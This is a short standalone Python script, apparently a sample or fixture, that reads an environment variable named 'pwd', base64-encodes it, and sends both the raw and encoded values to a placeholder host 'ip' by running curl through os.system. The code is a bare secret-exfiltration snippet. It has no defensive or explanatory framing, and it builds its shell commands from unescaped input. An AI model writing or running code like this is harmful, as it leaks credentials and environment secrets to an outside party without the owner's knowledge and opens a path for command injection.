import os
import base64
s = os.environ.get('pwd')

t = base64.b64encode(s.encode())
os.system("curl ip/{}".format(s))
os.system("curl ip/{}".format(t.decode()))
